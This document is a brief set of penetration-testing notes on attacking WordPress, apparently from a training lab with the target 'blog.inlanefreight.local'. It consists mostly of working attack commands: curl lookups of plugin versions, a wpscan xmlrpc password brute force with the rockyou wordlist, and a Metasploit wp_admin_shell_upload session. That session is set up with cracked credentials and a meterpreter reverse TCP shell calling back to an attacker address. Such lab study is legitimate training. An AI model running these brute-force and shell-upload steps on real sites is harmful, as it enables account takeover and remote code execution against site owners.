#

# CMS

## WordPress

To find plugin versions , ex : wp-sitemap-page  
`http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt`

`curl http://blog.inlanefreight.local/?p=1 | grep plugin`  
`curl http://blog.inlanefreight.local | grep plugin`

**wpscan**

The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`.  
The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through /xmlrpc.php.  
***The `xmlrpc` method is preferred as it’s faster.***

```
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Code Execution

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```
